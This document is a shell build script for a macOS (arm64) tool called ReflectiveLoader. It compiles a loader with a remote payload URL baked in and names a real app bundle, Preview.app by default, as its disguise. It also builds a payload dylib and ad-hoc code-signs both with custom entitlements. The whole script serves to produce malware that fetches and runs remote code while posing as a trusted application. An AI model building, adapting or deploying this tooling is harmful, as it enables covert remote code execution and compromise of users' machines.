#!/bin/sh
set -eu

script_dir=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$script_dir"

if [ "$(uname -m)" != "arm64" ]; then
  echo "build.sh: Apple Silicon (arm64) is required" >&2
  exit 1
fi

warmup=0
payload_url=""
target_bundle=""
while [ $# -gt 0 ]; do
  case "$1" in
    --warmup) warmup=1 ;;
    --target)
      shift
      [ $# -gt 0 ] || { echo "build.sh: --target requires an argument" >&2; exit 1; }
      target_bundle="$1"
      ;;
    *) payload_url="$1" ;;
  esac
  shift
done

if [ -z "$payload_url" ]; then
  echo "Usage: build.sh [--warmup] [--target /path/to/App.app] <payload-url>" >&2
  exit 1
fi

if [ -z "$target_bundle" ]; then
  target_bundle="/System/Applications/Preview.app"
fi

target_app_name=$(basename "$target_bundle" .app)
target_executable="$target_bundle/Contents/MacOS/$target_app_name"
[ -d "$target_bundle" ] || { echo "build.sh: target bundle not found: $target_bundle" >&2; exit 1; }
[ -x "$target_executable" ] || {
  if [ -f "$target_bundle/Contents/Info.plist" ]; then
    plist_exec=$(/usr/bin/plutil -extract CFBundleExecutable raw "$target_bundle/Contents/Info.plist" 2>/dev/null) || plist_exec=""
    if [ -n "$plist_exec" ] && [ -x "$target_bundle/Contents/MacOS/$plist_exec" ]; then
      target_app_name="$plist_exec"
      target_executable="$target_bundle/Contents/MacOS/$plist_exec"
    else
      echo "build.sh: cannot find executable in target bundle" >&2; exit 1
    fi
  else
    echo "build.sh: target executable not found: $target_executable" >&2; exit 1
  fi
}

sdk_path=$(xcrun --sdk macosx --show-sdk-path)
rm -rf build
mkdir -p build

printf '%s\n%s\n' "$target_bundle" "$target_app_name" > build/.target

warmup_flag=""
if [ "$warmup" -eq 1 ]; then
  warmup_flag="-DWARMUP_ENABLED=1"
fi

# Build the ReflectiveLoader executable with baked-in URL and target binary
xcrun clang++ -std=c++17 -arch arm64 \
  -isysroot "$sdk_path" \
  -I Sources \
  -DPAYLOAD_URL="\"$payload_url\"" \
  -DREAL_BUNDLE="\"$target_bundle\"" \
  $warmup_flag \
  -framework Foundation \
  -framework AppKit \
  -framework CoreServices \
  -framework UniformTypeIdentifiers \
  Sources/main.mm lib/libloader.a \
  -o build/ReflectiveLoader

# Build the payload dylib
xcrun clang -arch arm64 \
  -isysroot "$sdk_path" \
  -framework Foundation \
  -dynamiclib \
  Sources/payload.m \
  -o build/libpayload.dylib

# Sign with entitlements
/usr/bin/codesign --force --sign - \
  --entitlements Sources/ReflectiveLoader.entitlements \
  build/ReflectiveLoader
/usr/bin/codesign --force --sign - build/libpayload.dylib
